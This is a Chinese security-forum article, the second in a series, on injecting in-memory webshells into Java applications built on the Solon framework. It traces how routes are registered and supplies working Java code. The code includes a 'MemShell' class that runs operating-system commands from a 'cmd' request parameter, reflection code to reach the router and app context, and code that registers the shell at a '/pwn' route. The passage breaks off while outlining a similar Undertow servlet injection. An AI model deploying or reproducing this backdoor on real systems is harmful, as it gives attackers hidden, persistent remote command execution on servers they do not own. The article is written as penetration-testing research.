---
title: Solon框架注入内存马(二)
url: https://forum.butian.net/share/3717
source: 奇安信攻防社区
date: 2024-09-14
fetch_date: 2025-10-06T18:24:12.855033
---

# Solon框架注入内存马(二)

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### Solon框架注入内存马(二)

* [渗透测试](https://forum.butian.net/topic/47)

接上一篇文章思考部分，该框架应该还可以注入其他内存马

Solon框架注入内存马(二)
===============
接上一篇文章思考部分，该框架应该还可以注入其他内存马，下面通过对[solon-examples](https://github.com/opensolon/solon-examples)这个项目调试分析
Handler内存马
----------
命名可能不太准确，暂时这么叫吧，调试的是demo3011-web
在HelloworldController中，在此思考一个问题，路由“/helloworld”是如何绑定HelloworldController类的helloworld()方法的，断点调试一下
![image-20240815112051896](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-420e2ea474f92deaf9eecee563210cb49926f317.png)
逐个查看和分析当前调用栈，来到org.noear.solon.core.route.RouterHandler这个类的handle方法
![image-20240815113545106](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-858e0740e1e7ae591894bb71ca81e6afff17ea72.png)
其中this.router大有来头，里面存储着当前所有的路径信息，包括对应作用的类和方法，请求路径和请求方式
![image-20240815113639541](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-7ba88f3e988d1bef3fb60ea2d4f9453f05368072.png)
找到“/helloworld”，可以看到ActionDefault对象里存储着对应类`HelloworldController`
![image-20240815114056863](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-480441e8c4e77b1fe1e9b1e2f6b2fc24cd61d67e.png)
如果能够动态的在routesH添加一条RouterDefault，估计就能够实现内存马了
如何添加？
在org.noear.solon.core.route.RouterDefault这个类中，存在add方法，可以往routesH\[1\]添加RoutingDefault
![image-20240815120042514](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-75f4613151570d75661a30e8e30b77dc7fa5efdb.png)
add方法有几个，找个简单点的
![image-20240815120527027](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-8f5fbf24d1394ccca0d1c22682f3ebf840022c8a.png)
其中第一个参数expr是路径,MethodType method是请求方式，至于Handler handler，则是一个ActionDefault对象，ActionDefault实现了Handler
![image-20240815121136525](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-09a3dae6012615f9106fdefe6767a00dbb9d7f48.png)
![image-20240815121236098](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-9989c5f54c31a4f58dd92d512c5e60a5d429f2e3.png)
这里new一个ActionDefault对象就行了，查看构造方法
![image-20240815121839833](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-1f43bd96a4582b84a7c2e55c7a8dcce08a5b021a.png)
使用最简单的，也需要两个参数，其中BeanWrap 对象需要 AppContext和Class两个参数
![image-20240815122043864](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-878a995901eb1be7f0ee8e0807eb611982a846ef.png)
AppContext 是 Solon 框架的核心组件是应用上下文接口，可在上下文获取，Class clz则是路径下对应的类
回到ActionDefault这里的Method，则是Class clz下的方法，就是只访问路径时，会调用的方法，这个可通过反射获取
综上，内存马构造如下：
第一步，先搞个恶意类：
```java
public static class MemShell{
       public MemShell(){
​
      }
       public  void pwn(){
           Context ctx \= Context.current();
           try{
               if(ctx.param("cmd")!=null){
                   String str \= ctx.param("cmd");
                   try{
                       String\[\] cmds \=
                               System.getProperty("os.name").toLowerCase().contains("win") ? new String\[\]{"cmd.exe",
                                       "/c", str} : new String\[\]{"/bin/bash", "-c", str};
                       String output \= (new java.util.Scanner((new
                               ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\\\A").next();
                       ctx.output(output);
                  }catch (Exception e) {
                       e.printStackTrace();
                  }
              }
          }catch (Throwable e){
               ctx.output(e.getMessage());
          }
      }
  }
```
第二步，获取到存储大量路径内容的RouterDefault，即前面的this.router ，还有获取AppContext
反射获取对象：
```java
public Object getfieldobj(Object obj, String fieldname) throws NoSuchFieldException, IllegalAccessException {
       try{
           Field field \= obj.getClass().getDeclaredField(fieldname);
           field.setAccessible(true);
           Object fieldobj \= field.get(obj);
           return fieldobj;
      }catch (NoSuchFieldException e) {
           Field field \= obj.getClass().getSuperclass().getDeclaredField(fieldname);
           field.setAccessible(true);
           Object fieldobj \= field.get(obj);
           return fieldobj;
      }
  }
```
获取RouterDefault和AppContext ，这个可以使用java-object-searcher工具查找
```java
Context ctx \= Context.current();
Object \\_request \= getfieldobj(ctx,"\\_request");
Object request \= getfieldobj(\\_request,"request");
Object serverHandler \= getfieldobj(request,"serverHandler");
Object handler \= getfieldobj(serverHandler,"handler");
Object arg$1 \= getfieldobj(handler,"arg$1");
​
AppContext appContext \= (AppContext) getfieldobj(arg$1,"\\_context");
RouterDefault \\_router \= (RouterDefault) getfieldobj(arg$1,"\\_router");
```
第三步，注册
```java
BeanWrap beanWrap \= new BeanWrap(appContext,MemShell.class);
Method method \= MemShell.class.getDeclaredMethod("pwn");
Handler newhandler \= new ActionDefault(beanWrap,method);
\\_router.add("/pwn", MethodType.ALL,newhandler);
```
验证：动态注册后访问
![image-20240815123253817](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-6c71658f69c9ea6cf3afe468be1d17ad8f7e7001.png)
JBoss AS中间件
-----------
总会有些老的项目或者某些框架，必须使用 Servlet 的接口。。。Solon 对这种项目，也提供了良好的支持。
当需要 Servlet 接口时，需要使用插件：
- 或者 solon.boot.jetty
- 或者 solon.boot.undertow
这块内容，也有助于用户了解 Solon 与 Servlet 的接口关系。Solon 有自己的 Context + Handler 接口设计，通过它以适配 Servlet 和 Not Servlet 的 http server，以及 websocket, socket（以实现三源合一的目的）：
- 其中 solon.web.servlet ，专门用于适配 Servlet 接口。
调试发现,这里用的是`io.undertow.servlert`的api,即JBoss AS (JBoss Application Server),和常用的不太一样
### Servlet
使用demo3012-web\\_servlet进行调试分析，查看这些中间件是如何被注册的，在HeheServlet下个断点，访问对应路径进行调试
![image-20240816175142048](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-fb52865f64c0e0bbec733894f8278fcb4438c750.png)
发现有很多个handleRequest，查看最初始的那个，来到了`io.undertow.servlet.handlers.ServletInitialHandler`
![image-20240816175453732](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-3594b9d5715a6a3be429244103a09489b8c65454.png)
这里的servletRequestContext应该是当前请求的上下文，查看`servletRequestContext.getOriginalServletPathMatch().getServletChain()`
![image-20240816175758744](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-72f9e17d222f452a78d5650748aae529d6cd4cc7.png)
可以看到当前请求所对应的Servlet的信息，保存在Servletinfo对象中,查看一下这个类，来到`io.undertow.servlet.api.ServletInfo`
![image-20240816180506212](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-5dbf25a91f89409c36bcb313e165400fb5f86e8a.png)
这个类的构造函数中就，会保存servlet的类和名。Servlet是应用启动时注册的，在这里下个断点，重启应用
![image-20240816182419294](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-1aa3e5bd36c3f2586eb0fc90f6dcdd8078636c0d.png)
成功断点，并来到了注册HeHeServlet的瞬间，调用栈往前查看，来到`io.undertow.servlet.spec.ServletContextImpl`的addServlet
![image-20240816183021386](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-8461bca63f07081e72dd363f6dbec599d69779c7.png)
这个直接就是Servlet被注册的过程了，可以根据这几个步骤进行动态注册
PS：这里不能直接用当前的`addServlet`,前面存在判断`this.ensureNotInitialized();`，如果已经初始化了，就不再能往下允许，尝试反射修改也改不了
大概步骤：
- 获取到deployment和deploymentInfo
- new ServletInfo()，配置好Servlet的各种信息
- deploymentInfo.addServlet(servletInfo)
- deployment.getServlets().addServlet(servletInfo);
首先我们需要两个对象，deployment和deploymentInfo，其实拿到deployment就能拿到deploymentInfo
![image-20240816192007550](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-591089be7bbb001f48b73170545f8aef9e687e87.png)
如何拿到deployment和deploymentInfo？，这需要分为两种情况，如果已经当前存在类似ServletRequest req, Serv...